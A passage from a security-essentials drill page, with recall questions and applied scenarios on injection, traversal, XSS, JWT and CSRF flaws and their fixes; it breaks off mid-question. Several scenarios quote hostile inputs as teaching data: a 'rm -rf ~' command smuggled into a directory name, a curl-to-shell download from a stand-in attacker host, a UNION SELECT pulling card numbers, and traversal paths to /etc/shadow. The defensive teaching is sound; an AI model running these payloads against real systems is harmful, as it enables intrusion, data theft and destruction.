---
title: "Overview"
date: 2026-07-16T00:00:00+07:00
draft: false
weight: 1
---

This page is the active-recall companion to the Security Essentials learning track: four fixed
drills that force retrieval instead of passive re-reading. Work through them in order -- short-answer
recall first, then scenario judgment, then hands-on implementation, then a checklist to confirm real
automaticity. Every answer is hidden in a `<details>` block; try each item yourself, out loud or on
paper, before opening it. Every prompt below uses its own mocked, self-contained scenario -- different
function names, endpoint names, and domains from anything in the learning track's 80 worked
examples -- so recognizing an answer isn't enough; you have to actually reconstruct the reasoning.
Nothing on this page requires a live network listener, a real database server, root access, or any
external service -- every scenario is reasoned about on paper or run with pure-stdlib/in-memory code,
including this topic's own already-pinned toolchain used entirely locally (argon2-cffi, PyJWT, Flask's
in-process test client, sqlite3's `:memory:`).

## Recall Q&A

Twenty-eight short-answer questions, one per concept (`co-01` through `co-28`). Answer from memory,
then check.

**Q1 (co-01 -- trust-boundaries-never-trust-input).** A parcel-tracking service reads the `carrier`
field out of an inbound webhook payload sent by a delivery partner and passes it straight into a
lookup without validation, reasoning "this only comes from our own partner API, so it's already
clean." What's wrong with that reasoning, and what should change?

<details>
<summary>Answer</summary>

Any place data enters your code from outside your own process is a trust boundary, regardless of who
nominally "owns" the sender -- a partner's webhook endpoint, an upstream API response, and a message
queue payload all count as attacker-reachable, since nothing stops a compromised partner system, an
intermediary, or a schema-abusing request from producing a hostile value. The `carrier` field must be
validated at the exact point it crosses into your own code, regardless of the perceived trustworthiness
of the sender.

</details>

**Q2 (co-02 -- owasp-top-10-as-risk-map).** A team lead says "we don't need to think about the OWASP
Top 10 -- we already have a bug tracker that lists every security issue we've found." What does
mapping a bug to an OWASP Top 10:2025 category add that a plain bug-tracker entry doesn't?

<details>
<summary>Answer</summary>

The Top 10 isn't a replacement for tracking individual bugs; it's a shared risk vocabulary that groups
many individually-different bugs under one named, prioritized category (e.g. "A05 Injection" or "A07
Authentication Failures"), letting a team see patterns across bugs, prioritize which category to defend
against first, and communicate risk to people who never read the individual ticket. A bug-tracker entry
alone only says "this one ticket exists," not "we have a pattern of authentication-failures problems."

</details>

**Q3 (co-03 -- sql-injection-and-parameterized-queries).** A junior engineer "fixes" a SQL injection by
adding `.replace("'", "''")` (escaping single quotes) to user input before concatenating it into a
query string, instead of switching to a parameterized query. Why is this an incomplete fix?

<details>
<summary>Answer</summary>

Escaping is a manual, error-prone, dialect-specific patch that only defends against the one payload
pattern (single quotes) the developer thought of -- it can still be defeated by other SQL metacharacters,
encoding tricks, or a dialect-specific escaping edge case, and the input is still fundamentally treated
as part of the SQL string, not as pure data. Parameterized queries structurally separate the query
template (code) from the values (data) -- the driver sends them separately, so no value can ever be
reinterpreted as SQL syntax, regardless of what characters it contains.

</details>

**Q4 (co-04 -- command-injection).** A backup tool builds a shell command as
`f"tar -czf {archive_name}.tar.gz {source_dir}"` and runs it with `os.system(...)`. A user names their
source directory `data; rm -rf ~`. What happens, and what's the general-purpose fix (not a specific
character blocklist)?

<details>
<summary>Answer</summary>

Because `os.system` hands the whole string to a shell, the semicolon terminates the `tar` command and
starts a second command, `rm -rf ~`, which the shell executes with the same privileges as the backup
tool -- the attacker didn't need to escape anything, just supply a shell metacharacter. The
general-purpose fix is to stop invoking a shell at all:
`subprocess.run(["tar", "-czf", f"{archive_name}.tar.gz", source_dir], shell=False)` passes each
argument directly as an argv list, so there is no shell present to interpret `;`, `|`, backticks, or any
other metacharacter as anything but literal argument text.

</details>

**Q5 (co-05 -- path-traversal).** A document-preview service serves files from
`/srv/previews/<filename>`, building the path with `os.path.join(PREVIEW_ROOT, filename)`. A request
asks for `filename=../../../../etc/shadow`. Why does `os.path.join` alone not stop this, and what two
things does the actual fix need?

<details>
<summary>Answer</summary>

`os.path.join` just concatenates path segments -- it has no concept of "stay inside this directory," so
`../` segments in the filename walk the resulting path right back out of `PREVIEW_ROOT`. The fix needs
two things together: canonicalize the joined path (e.g. `Path(...).resolve()`, which collapses `..`
segments), then explicitly verify the resolved, canonical path still starts with `PREVIEW_ROOT`'s own
canonical path before serving it -- canonicalizing without the prefix check, or prefix-checking the
un-resolved path, both still leave an escape route.

</details>

**Q6 (co-06 -- xss-and-output-encoding).** A support-ticket app HTML-encodes a customer's ticket
subject before rendering it inside the page body (`<div>{subject}</div>`) and considers XSS handled
everywhere on the page. The same subject is also inserted into an inline
`<script>onclick="viewTicket('{subject}')"</script>` handler elsewhere on the page. Why does the first
fix not protect the second location?

<details>
<summary>Answer</summary>

Output encoding is context-specific -- HTML-body encoding neutralizes characters like `<` and `>` so
they can't open a new tag, but inside a JavaScript string literal the dangerous characters are
different (a quote or backslash can break out of the string and inject arbitrary JS), and HTML-body
encoding does nothing to escape those. Each distinct output context (HTML body, HTML attribute, JS
string, URL) needs its own matching encoder applied at the point the value enters THAT context, not one
encoding pass reused everywhere.

</details>

**Q7 (co-07 -- allow-list-vs-deny-list-validation).** A file-upload feature blocks uploads by checking
the filename extension against a list of dangerous ones: `.exe`, `.sh`, `.bat`, `.php`. A user uploads
`payload.phtml` and it's accepted and later executed by the web server. What category of validation
mistake is this, and what's the fix?

<details>
<summary>Answer</summary>

This is a deny-list -- it rejects only the specific bad extensions someone enumerated, and `.phtml` (a
real, server-executable PHP variant extension) simply wasn't on the list, so anything not explicitly
blocked is implicitly allowed. The fix is an allow-list: define the small, known-good set of extensions
the feature actually needs (e.g. `.jpg`, `.png`, `.pdf`) and reject everything else by default, so a
novel or unusual dangerous extension is rejected automatically instead of requiring someone to have
predicted it in advance.

</details>

**Q8 (co-08 -- mass-assignment-and-over-posting).** A profile-update endpoint does
`Profile(**request.json)` to build the updated profile, intending to let users edit `display_name` and
`bio`. A user submits
`{"display_name": "Alex", "bio": "...", "account_tier": "enterprise"}`. What happens, and what's the
fix?

<details>
<summary>Answer</summary>

`**request.json` binds every key in the request body onto the model's constructor, not just the fields
the UI intended to expose -- since `account_tier` happens to be a real field on `Profile`, the client
silently sets it, even though no legitimate UI path ever offers that control. The fix is an explicit
allow-list of bindable fields (pull only `display_name` and `bio` out of the JSON by name, or use a
dedicated input schema with no `account_tier` field at all), so a request can never set a field the API
didn't intend to expose.

</details>

**Q9 (co-09 -- password-hashing-argon2id-bcrypt).** A team stores user passwords as
`hashlib.sha256(password.encode()).hexdigest()`, reasoning "SHA-256 is a real cryptographic hash, so
this is secure." Why is this still broken for password storage specifically, and what should replace
it?

<details>
<summary>Answer</summary>

SHA-256 is a general-purpose cryptographic hash designed to be FAST -- exactly the wrong property for
password storage, since it lets an attacker who steals the hash table try billions of candidate
passwords per second on cheap hardware or GPUs. Password storage needs a hash deliberately designed to
be slow and memory-hard, like argon2id or bcrypt, which cap an attacker's guessing rate to a small
fraction of SHA-256's, even against dedicated cracking hardware.

</details>

**Q10 (co-10 -- salting-and-why).** Two different users both choose the password `"Summer2026!"`. In a
system using unsalted SHA-256, their stored hashes are identical. In a system using argon2id (which
salts automatically), their stored hashes differ. Why does that identical-vs-different pattern matter
to an attacker who has stolen the whole password table?

<details>
<summary>Answer</summary>

Identical hashes for identical passwords let an attacker precompute a table of hash-to-password pairs
once, or simply cross-reference users against each other, and instantly identify every user who shares
a common password, without any per-user cracking effort. A unique per-hash salt makes the SAME password
produce a DIFFERENT stored hash for every user, so a precomputed table is useless -- the attacker must
attack each hash individually from scratch, multiplying the cost by the number of users.

</details>

**Q11 (co-11 -- timing-safe-comparison).** An internal API validates a webhook signature with
`if received_signature == expected_signature:`. A security reviewer flags this even though the
comparison is logically correct. What can an attacker learn from repeatedly submitting slightly
different signature guesses, and what should replace `==`?

<details>
<summary>Answer</summary>

Python's `==` compares byte-by-byte and returns as soon as it finds the first mismatch, so a guess that
matches more leading bytes takes measurably longer to reject -- with enough repeated timing
measurements, an attacker can recover the correct signature one byte at a time, without ever guessing it
in one shot. `hmac.compare_digest(received_signature, expected_signature)` always compares in constant
time regardless of how many leading bytes match, eliminating that timing side-channel.

</details>

**Q12 (co-12 -- session-vs-token-auth).** A team migrates from server-side sessions to stateless JWTs
specifically to make their API "horizontally scalable without sticky sessions," then discovers they
have no way to immediately force-log-out a compromised account. What trade-off did they not think
through?

<details>
<summary>Answer</summary>

Server-side sessions store the authoritative validity state on the server, so revoking one is just
deleting that record. Stateless tokens carry their own validity self-contained (a signature plus an
expiry claim) and are validated WITHOUT any server-side lookup, which is exactly what makes them
horizontally scalable -- but it also means there's no central place to "delete" a token before its `exp`
naturally expires; instant revocation needs extra machinery (a short expiry plus refresh, or a
server-side revocation check) that reintroduces some of the statefulness the team was trying to avoid.

</details>

**Q13 (co-13 -- secure-cookie-flags).** A login system sets its session cookie with no special flags.
An attacker who can inject JavaScript into any page on the same site (via a separate, unrelated XSS
bug) uses `document.cookie` to exfiltrate the session cookie, and separately, the cookie is also
observed being sent over a plain `http://` connection to a non-HTTPS subdomain. Name the two flags that
would have independently blocked each of these, and what each one specifically does.

<details>
<summary>Answer</summary>

`HttpOnly` blocks the `document.cookie` read -- a cookie marked `HttpOnly` is invisible to JavaScript
entirely, so even a successful XSS injection can't read or exfiltrate it. `Secure` blocks the plain-HTTP
transmission -- a cookie marked `Secure` is only ever sent over an HTTPS connection, never plain HTTP, so
it can't be captured by anyone observing unencrypted traffic. (A third flag, `SameSite`, is a separate
defense against cross-site request forgery, not either of these two issues.)

</details>

**Q14 (co-14 -- jwt-specific-pitfalls).** A verifier reads a token's own `alg` header first: if it says
`HS256`, the verifier hand-computes an HMAC-SHA256 signature using the server's known RSA public key as
the secret and compares it byte-for-byte; any other `alg` is passed to
`jwt.decode(token, public_key, algorithms=["RS256"])`. An attacker who knows the server's RSA public key
crafts a token signed with HS256 using that public key's bytes AS the HMAC secret. Why does this forged
token verify successfully, and what single change to the verifier's structure would have stopped it?

<details>
<summary>Answer</summary>

Because the verifier dispatches on the token's own, attacker-controlled `alg` header instead of pinning
one expected algorithm family, an attacker who declares `alg: HS256` diverts verification into the
hand-rolled HMAC branch, where the publicly-known RSA public key is treated as if it were a shared HMAC
secret -- the attacker signed with that exact same "secret," so the recomputed HMAC matches. The fix is
to never let the token's own header choose the verification path: call
`jwt.decode(token, public_key, algorithms=["RS256"])` unconditionally, so a token claiming HS256 is
rejected outright by PyJWT's algorithm allow-list instead of ever reaching a hand-rolled verifier. (PyJWT
`>=2.x`'s `jwt.decode()` itself already fails closed here -- calling it with no `algorithms=` argument
raises `DecodeError` unconditionally, before ever inspecting the token's claimed `alg`; the vulnerability
lives in the hand-rolled dispatch layer sitting in front of `jwt.decode()`, not in `jwt.decode()`'s own
default behavior.)

</details>

**Q15 (co-15 -- authentication-vs-authorization).** A ticket says "the bug is in authentication -- a
logged-in support agent was able to view another department's confidential tickets." Is that actually
an authentication bug? Explain the distinction.

<details>
<summary>Answer</summary>

No -- the agent's authentication (proving who they are) worked perfectly and wasn't in question; the
failure is in authorization (deciding what an authenticated identity is allowed to do), specifically a
missing or incorrect permission check on which tickets an agent's department can view. Authentication
answers "is this really Agent X," and authorization answers "may Agent X see THIS resource" -- two
separate checks, and this ticket describes the second one failing while the first succeeded correctly.

</details>

**Q16 (co-16 -- least-privilege-access-control).** A reporting microservice only ever runs `SELECT`
queries against three specific tables, but connects using the same admin database credentials the main
application uses (which can `DROP TABLE`, `ALTER`, and read every table). A SQL injection bug is later
found in the reporting service. Why does the choice of DB credentials matter here, independent of
fixing the injection bug itself?

<details>
<summary>Answer</summary>

The injection bug is a separate problem to fix regardless, but the blast radius of that bug is entirely
determined by what the compromised connection is ALLOWED to do -- with admin credentials, a successful
injection can read, modify, or destroy any table in the schema. A least-privilege database account
scoped to `SELECT`-only on exactly the three tables the reporting service needs would mean the SAME
injection bug, if exploited, could only leak data from those three tables -- the vulnerability's
existence doesn't change, but its worst-case impact shrinks dramatically.

</details>

**Q17 (co-17 -- secret-hygiene).** A developer accidentally commits an API key to a public git
repository, notices within an hour, deletes the line in a follow-up commit, and force-pushes to remove
it from history. Is the key still compromised? Why or why not?

<details>
<summary>Answer</summary>

Yes -- the key must still be treated as compromised and rotated. A force-push can rewrite the branch's
history on the remote, but it cannot un-happen the fact that the key was, for some window, present in a
public repository, which anyone (an automated scraper, a bot indexing public commits, a clone made in
that window) could already have captured. Secret hygiene treats "was it ever exposed" as irreversible;
the only real remediation is rotating the secret, not trying to erase the exposure after the fact.

</details>

**Q18 (co-18 -- https-tls-in-practice).** An internal service-to-service HTTP client is configured with
`requests.get(url, verify=False)` because a self-signed certificate was causing SSL errors, and
disabling verification was the fastest way to make the errors go away. What protection does this remove,
and what's the correct fix instead?

<details>
<summary>Answer</summary>

`verify=False` disables certificate validation entirely, so the client accepts a TLS connection to
literally any server presenting any certificate (including an attacker performing a man-in-the-middle
attack) as if it were the legitimate destination -- TLS's encryption may still be technically active, but
its authentication guarantee (that you're actually talking to who you think you're talking to) is gone.
The correct fix is to make the client trust the SPECIFIC certificate, or the specific internal CA that
issued it, via a `verify=` path to a CA bundle, rather than disabling verification for everyone.

</details>

**Q19 (co-19 -- security-headers).** A site's response includes a strict `Content-Security-Policy` but
is missing `X-Frame-Options`/`frame-ancestors`. An attacker embeds the site's login page inside an
invisible `<iframe>` on their own page and tricks users into clicking through what looks like a game,
actually clicking the real login page's buttons underneath. Which control was missing, and why doesn't
CSP alone cover this?

<details>
<summary>Answer</summary>

`X-Frame-Options` (or CSP's own `frame-ancestors` directive) is the control specifically responsible for
telling the browser whether the page may be embedded inside another site's `<iframe>` at all -- a strict
CSP that only restricts script sources doesn't automatically forbid framing unless its `frame-ancestors`
directive is ALSO set. Without either control present, the browser has no instruction to refuse
rendering the page inside a foreign frame, leaving the clickjacking attack fully available even with
other headers correctly configured.

</details>

**Q20 (co-20 -- cors-configuration).** A public API's CORS middleware reflects whatever `Origin` header
the browser sends back as `Access-Control-Allow-Origin`, and also sets
`Access-Control-Allow-Credentials: true`. What does this combination let a malicious third-party
website do that a same-origin-only policy would have prevented?

<details>
<summary>Answer</summary>

Reflecting any origin back as allowed, combined with allowing credentials, means a malicious site can
make a credentialed cross-origin request (the victim's browser automatically attaches their session
cookie) to the real API, and the browser lets the malicious page's JavaScript read the response --
effectively letting any site read another user's authenticated data through their own browser, exactly
what the same-origin policy exists to prevent. The fix is an explicit allow-list of known, trusted
origins, never a blanket reflection of the request's own `Origin`, especially when credentials are also
allowed.

</details>

**Q21 (co-21 -- dependency-safety-supply-chain).** A team's `requirements.txt` pins every package to an
exact version and passes a clean `pip-audit` run. A month later, one of those exact-pinned packages is
discovered to have a newly-disclosed CVE. Did pinning fail to protect the team? What's the actual role
pinning plays here versus what auditing plays?

<details>
<summary>Answer</summary>

Pinning didn't fail -- pinning's job is reproducibility (everyone installs the exact same, previously
reviewed versions, with no surprise drift), not clairvoyance about future disclosures; a CVE disclosed a
month later couldn't have been caught by an audit run before it was publicly known. The two controls are
complementary and ongoing, not one-time: pinning keeps the dependency tree stable and reviewable, while
re-running `pip-audit` periodically (not just once at initial pin time) is what actually catches
newly-disclosed CVEs against packages already pinned.

</details>

**Q22 (co-22 -- security-logging-and-alerting).** A security engineer reviewing a login endpoint's logs
finds `{"event": "login_failed", "username": "jsmith", "password_attempted": "Winter2026!", "ip":
"203.0.113.9"}`. What's wrong with this log entry, independent of whether login failures should be
logged at all?

<details>
<summary>Answer</summary>

Logging the actual attempted password value is itself a security incident waiting to happen -- logs are
typically retained, backed up, and readable by a wider set of people/systems than the application's own
auth logic, so a plaintext password (even a wrong one -- many users reuse passwords or make small typos
of their real one) sitting in a log store is now an additional, unnecessary exposure surface. Security
logging should record the who/what/outcome of an authentication decision but never the credential value
itself, successful or not.

</details>

**Q23 (co-23 -- safe-error-handling).** A production API returns this on an unhandled exception:
`{"error": "IntegrityError: duplicate key value violates unique constraint \"users_email_key\" DETAIL:
Key (email)=(alex@example.com) already exists."}`. List two distinct things wrong with returning this to
the client, and what should replace it.

<details>
<summary>Answer</summary>

First, it leaks internal implementation detail (the database engine, the constraint name, the ORM's
exact exception class) that helps an attacker map the system's internals. Second, in this case it also
confirms to an unauthenticated caller that `alex@example.com` IS a registered account, itself sensitive
information for account enumeration, independent of the stack-trace leak. The client should receive a
generic message (`{"error": "Registration failed"}`), while the full exception detail is written to a
server-side log where developers can actually use it to debug.

</details>

**Q24 (co-24 -- security-misconfiguration).** A production deployment of a web framework has its
interactive in-browser debugger enabled, because nobody explicitly turned it off before deploying. Is
this a code vulnerability that needs a patch, or something else -- and why does that distinction matter
for how it gets fixed?

<details>
<summary>Answer</summary>

This is a security misconfiguration, not a code-level vulnerability -- the debugger code isn't "buggy,"
it's working exactly as designed; the problem is that a setting meant only for local development (which
can expose an interactive code-execution console to anyone who triggers an error) was left in its
insecure default state in production. The fix isn't a code patch to the framework, it's hardening the
deployment CONFIGURATION -- explicitly setting debug mode off in production, ideally enforced by an
environment-aware startup check rather than relying on someone remembering to flip a flag.

</details>

**Q25 (co-25 -- insecure-design).** A "refer a friend" feature correctly validates the referral code
format, checks the code exists, and correctly credits the referring account -- every individual piece of
code behaves exactly as specified. A user discovers they can create unlimited throwaway accounts, each
referring their own main account, harvesting the bonus indefinitely. Is this a coding bug? What kind of
fix does it actually need?

<details>
<summary>Answer</summary>

No individual line of code is behaving incorrectly -- every piece does exactly what it was specified to
do; the flaw is in the DESIGN of the feature, which never accounted for an attacker being both the
referrer and (via disposable accounts) the referee, an abuse case that requires no implementation
mistake at all. This is insecure design, and the fix isn't a patch to any one function -- it requires
re-threat-modeling the feature (e.g. one-bonus-per-verified-identity, or rate-limiting new-account
creation from the same source) before any code change is even chosen.

</details>

**Q26 (co-26 -- csrf-protection).** A banking app's `POST /transfer` reads the destination account and
amount from form fields, authenticated purely via the user's ambient session cookie. An attacker hosts
an auto-submitting HTML form on an unrelated site targeting that exact endpoint. Why does the victim's
browser send a valid, authenticated request even though the victim never intended to submit it, and
what's the general fix?

<details>
<summary>Answer</summary>

Browsers attach cookies to a request based purely on the DESTINATION domain, not on which site the
request originated from -- so a form hosted on the attacker's page, submitted even automatically via
JavaScript, still gets the victim's real session cookie attached by the browser, because as far as the
cookie jar is concerned it's just "a request to the bank's domain." The general fix is to bind the
request to proof that it originated from the bank's own page, not just proof of who the user is -- a
CSRF token embedded in the bank's own form (which the attacker's page has no way to read or forge) plus
`SameSite` cookie flags, which stop the cookie itself from being attached to many cross-site requests in
the first place.

</details>

**Q27 (co-27 -- rate-limiting-and-brute-force-protection).** A team, worried about credential-stuffing
attacks, locks an account for 24 hours after 5 failed login attempts, with no other throttling. An
attacker who wants to disrupt a competitor's business submits 5 wrong passwords for that competitor's
account, locking them out for a full day, on demand, repeatedly. What trade-off did the team not weigh,
and what's a common way to keep the anti-brute-force benefit while avoiding this failure mode?

<details>
<summary>Answer</summary>

A hard lockout defeats brute force at the cost of turning the lockout mechanism itself into a
denial-of-service tool -- anyone who merely knows a victim's username (no password needed) can lock them
out on demand by deliberately failing 5 times. A common alternative is exponential backoff (each failure
adds an increasing delay before the NEXT attempt is even accepted -- 1s, 2s, 4s, 8s...) rather than an
outright lockout, which still makes rapid brute-forcing impractical while never fully denying the
legitimate account owner access -- just increasing friction, rather than locking them out entirely
because of someone else's malicious attempts.

</details>

**Q28 (co-28 -- open-redirect).** A site's login flow supports `?next=<url>`, redirecting the user there
after a successful login. An attacker sends a phishing link
`https://real-site.com/login?next=https://reaI-site-login.com/steal` (the link visibly starts with the
real site's own domain). Why does a victim clicking this link end up on the attacker's page despite the
link starting with the real domain, and what's the fix?

<details>
<summary>Answer</summary>

The victim correctly lands on the real site first (the domain up to `/login` really is legitimate, which
is exactly why this is convincing bait), but the login flow then blindly redirects to whatever URL
`next=` contains, WITHOUT checking whether that target is still on the real site -- so after a real,
successful login, the browser is sent off to the attacker's look-alike domain. The fix is to validate the
`next=` target against an allow-list (accept only a relative, same-site path like `/dashboard`, never a
full external URL) before ever using it in a redirect.

</details>

## Applied problems

Fifteen scenarios spanning beginner through supply-chain and design material. Each describes a
realistic engineering situation without naming the specific tool or technique -- decide what applies and
why, then check your reasoning against the worked solution. Every scenario below is invented for this
drill and does not reuse any function, fixture, or domain from the 80 worked examples.

**AP1.** A "TicketNest" event-ticketing service takes a `seat_class` query parameter and builds a SQL
query by formatting it directly into a `WHERE` clause, reasoning "it's just an enum-like string from our
own dropdown, not raw user text." An attacker sends
`seat_class=general' UNION SELECT credit_card_number FROM billing --`. Diagnose the two separate
mistakes stacked here.

<details>
<summary>Worked solution</summary>

Trust-boundary mistake (co-01) -- the developer assumed "it's from our own dropdown menu" made the
value safe, but an HTTP query parameter is fully attacker-controlled regardless of what a legitimate
client's UI restricts it to; nothing stops an attacker from sending a raw HTTP request that bypasses the
UI. SQL-injection mistake (co-03) -- the value is concatenated directly into SQL text rather than bound
as a parameter, so once past the missing validation the attacker's payload executes as SQL syntax, not
string data. The fix needs both: validate `seat_class` against an allow-list of the real valid values,
AND always use a parameterized query for defense in depth even if the allow-list had a gap.

</details>

**AP2.** A photo-print kiosk app lets a user specify an output filename for a print job to preview, and
shells out with `subprocess.run(f"convert {input_path} {output_name}.pdf", shell=True)` to generate a
preview PDF. A QA tester notices setting the filename to `preview$(curl attacker.com/x.sh|sh)` causes
suspicious outbound network traffic during preview generation. What's happening, and what's the
general-purpose fix?

<details>
<summary>Worked solution</summary>

`shell=True` hands the whole interpolated string to a shell, and `$(...)` is shell command
substitution -- the shell executes the embedded `curl ... | sh` before even running `convert`,
downloading and running an arbitrary attacker script with the app's own privileges (co-04). This is
command injection through an untrusted filename field that looked like harmless user-facing text but
crossed into a shell command (co-01). The fix is
`subprocess.run(["convert", input_path, f"{output_name}.pdf"], shell=False)`, passing arguments as a
list so there's no shell present to interpret substitution syntax at all.

</details>

**AP3.** A course-materials portal serves lecture PDFs from `/materials/<course_id>/<filename>`, joining
the course ID and filename onto a base directory before opening the file. A support ticket reports that
a request for `filename=..%2f..%2fadmin%2fgrades.csv` returned the instructor's private grade file. The
code DOES call `os.path.abspath()` on the joined path before opening it -- what went wrong given that?

<details>
<summary>Worked solution</summary>

`abspath()` alone only normalizes a path (resolves `.`/`..` segments and makes it absolute) -- it does
NOT verify the result is still inside the intended root directory (co-05). The URL-encoded `..%2f`
sequences decode to `../` before reaching the path-join, walk the path outside `/materials/<course_id>/`,
and `abspath()` resolves the escaped path without complaint, since normalizing isn't the same as
containing. The fix needs an explicit check AFTER resolving: confirm the final, resolved path still
starts with the intended root directory's own resolved path, and reject the request if it doesn't.

</details>

**AP4.** A community-forum app renders each post's author-supplied "signature" field into the page
footer using the template engine's raw/unescaped-output syntax, deliberately chosen because some users
legitimately want to include a `<strong>` tag or two. Months later, a user reports another member's
signature silently follows their session to an external site. What's the actual mistake, and what should
replace "raw output for everyone"?

<details>
<summary>Worked solution</summary>

Choosing raw/unescaped output to accommodate a legitimate small formatting need accidentally also
disables encoding for everything else in that field, including any `<script>` tag a malicious user
includes -- the mistake conflates "allow some HTML" with "skip output encoding entirely" (co-06). The fix
is not to skip encoding, but to run the signature through an allow-list-based HTML sanitizer that permits
only a small, explicitly-approved set of tags/attributes (e.g. `<strong>`, `<em>`) and strips or encodes
everything else, including any `<script>`, event-handler attribute, or `javascript:` URL -- an allow-list
of tags, not a blanket decision to skip encoding (co-07).

</details>

**AP5.** A hotel-booking API's `PATCH /reservations/{id}` handler builds the updated reservation object
directly from the request body's JSON using the ORM model's own keyword-unpacking constructor, intending
to let guests update `check_in_date` and `special_requests`. A guest discovers they can also include
`"nightly_rate": 0.01` in the same request body and it's accepted. What's the underlying mistake,
distinct from "the guest shouldn't be allowed to see pricing internals"?

<details>
<summary>Worked solution</summary>

The mistake is binding the ENTIRE request body onto the model's constructor rather than pulling out only
the specific fields the endpoint is meant to let a guest edit -- since `nightly_rate` happens to be a
real attribute on the `Reservation` model, unpacking the whole JSON body sets it too, even though no
legitimate client UI ever exposes a price-editing control to guests (co-08). The fix is an explicit
allow-list of editable fields at the boundary -- read only `check_in_date` and `special_requests` out of
the body by name, or use a narrower input schema with no `nightly_rate` field at all -- a data-binding
discipline problem, not primarily an authorization/visibility problem.

</details>

**AP6.** A password-reset flow correctly hashes new passwords with argon2id, but a code review finds the
"check current password before allowing a change" step compares the submitted current password against
the stored hash using `argon2_hash(submitted) == stored_hash` (re-hashing the input and comparing
strings), instead of calling the library's dedicated `verify()` function. What specifically can silently
break this comparison, and why is `verify()` the actual fix?

<details>
<summary>Worked solution</summary>

Modern password hashers like argon2id embed the salt and algorithm parameters INSIDE the stored hash
string itself, and each `hash()` call generates a fresh, unique salt every time -- so re-hashing the
submitted password produces a DIFFERENT salt (and different full hash string) than the one stored, even
when the password itself is correct, making a raw `==` comparison fail even for the right password (co-09,
co-10). The library's `verify(stored_hash, submitted_password)` function extracts the salt and parameters
from the stored hash first, and uses those SAME values to re-derive a hash it can meaningfully compare --
the only correct way to check a password against a stored hash.

</details>

**AP7.** An internal admin tool authenticates automated deploy scripts via a shared API key sent in a
header, checked with `if request.headers.get("X-Deploy-Key") == DEPLOY_KEY:`. A red-team exercise later
shows they were able to guess the key byte-by-byte using response-timing measurements over thousands of
requests. What made this possible, and what one-line fix closes it?

<details>
<summary>Worked solution</summary>

Python's `==` short-circuits on the first mismatching byte, so a guessed key that matches more of the
real key's leading bytes takes measurably longer to be rejected than one that doesn't -- with enough
repeated, averaged timing samples, an attacker can recover the key one byte at a time (co-11). The fix
is `hmac.compare_digest(request.headers.get("X-Deploy-Key", ""), DEPLOY_KEY)`, which always takes the
same amount of time to return regardless of how many leading bytes match, removing the timing signal
entirely.

</details>

**AP8.** A team is deciding how to authenticate a new mobile app's API calls. One engineer argues for
JWTs "because sessions require a database lookup on every request, which doesn't scale." Another argues
for server-side sessions "because we need to be able to instantly kill a stolen device's access." Are
these actually incompatible requirements, and what's a middle-ground approach?

<details>
<summary>Worked solution</summary>

They're describing a genuine trade-off (stateless tokens avoid a per-request lookup but can't be
instantly revoked before expiry; server-side sessions can be revoked instantly but require that lookup),
not a case where one side is simply wrong (co-12) -- but the requirements aren't fully incompatible. A
common middle ground is a short-lived access token (validated statelessly, expiring in minutes) paired
with a longer-lived refresh token that IS checked against a server-side store on each use; revoking access
then means revoking the refresh token, and the compromised access token itself expires naturally within
its short window (co-14).

</details>

**AP9.** A multi-tenant SaaS billing dashboard serves `GET /api/invoices/{invoice_id}`. It correctly
requires a valid login, and the query correctly returns real invoice data for any numeric ID that exists
in the database. A customer notices they can view another company's invoice by simply incrementing the
ID in the URL. The team insists "this isn't a bug, the endpoint DOES require authentication." Are they
right?

<details>
<summary>Worked solution</summary>

They're right that authentication is working -- the request genuinely requires being logged in as SOME
valid user (co-15). But the endpoint has no authorization check at all: it never verifies that the
logged-in user's own tenant actually owns the requested `invoice_id`, so any authenticated user can view
any other tenant's data just by guessing or incrementing an ID -- an object-level access-control check
missing entirely, letting any account reach data no single user should be scoped to (co-16).

</details>

**AP10.** A logistics company's warehouse-scanning app stores its third-party shipping-carrier API key
as a Python constant, `CARRIER_API_KEY = "sk_live_..."`, directly in a file that's part of the git
repository (though the repository itself is private, visible only to the company's own engineers). A new
engineer argues this is fine "since it's not public, only our own team can see it." What's the actual
risk this reasoning misses?

<details>
<summary>Worked solution</summary>

"Private" only limits who can see it TODAY, under CURRENT access -- it does nothing about a leaked
laptop, a departing engineer's local clone, a CI job that echoes build logs publicly, a future accidental
repo-visibility change, or a compromised engineer account with repo access; a hardcoded secret is exposed
to every one of those future incidents by default, permanently, once it's in git history (co-17). The key
belongs in an environment variable or secrets manager, so a leak of the CODE alone never also leaks the
CREDENTIAL, and a leaked credential can be rotated independently of the code.

</details>

**AP11.** A weather-data API adds `Strict-Transport-Security`, `X-Content-Type-Options`, and a strict
`Content-Security-Policy`, and considers its "browser-facing hardening" complete. A pentest later
demonstrates a successful cross-site request forgery against `POST /alerts/subscribe`. Why didn't the
headers already in place stop this?

<details>
<summary>Worked solution</summary>

None of the three headers address CSRF at all -- `Strict-Transport-Security` only forces HTTPS,
`X-Content-Type-Options` only stops MIME-sniffing, and this CSP wasn't configured with anything relevant
to forged cross-site POSTs (co-19). CSRF is a distinct threat needing its own control -- an anti-CSRF
token bound to the legitimate page, and/or `SameSite` cookie flags on the session cookie -- not something
"add the standard security headers" automatically covers, since each header defends a specific, narrow
threat (co-26).

</details>

**AP12.** A team runs `pip-audit` in CI and it passes cleanly on every merge. Six months later, an
external researcher discloses that the exact-pinned version of a JSON-parsing library the team uses has
a request-smuggling vulnerability that's been present, and unpatched by that library, since before the
team even adopted it. Did the team's `pip-audit` process fail here?

<details>
<summary>Worked solution</summary>

Not exactly -- `pip-audit` can only flag CVEs already publicly known and present in its advisory database
at the moment it runs; a vulnerability that existed all along but wasn't publicly disclosed is invisible
to any audit tool until the disclosure happens, no matter how often the scan runs (co-21). A clean run is
a snapshot of "no known issues as of this run," not a permanent guarantee -- the actual gap, if any, would
be not re-running the audit periodically after the initial pin, since a clean run on day one doesn't
cover a disclosure on day 180.

</details>

**AP13.** A ride-share driver app's incident-report feature logs every failed login with
`{"event": "login_failed", "email": attempted_email, "ip": ip}`, but the security team says this alone
still isn't enough to catch an active credential-stuffing attack in progress. What's missing from
"logging the right fields" alone?

<details>
<summary>Worked solution</summary>

Logging captures raw evidence, but by itself does nothing to notice a PATTERN across many events in real
time (co-22) -- a human isn't watching the log stream continuously, so a burst of 500 failed logins
across 500 different accounts from a narrow IP range within one minute (the actual signature of
credential stuffing) sits unnoticed in the logs unless something actively watches for that pattern. The
missing piece is alerting logic layered on top of the logging -- a rule that fires when failed-login
counts from one source cross a threshold in a time window -- which surfaces an in-progress attack to a
human instead of leaving only a trail to review afterward (co-27).

</details>

**AP14.** A microservice calling a partner's payment-status API over HTTPS is configured with a custom
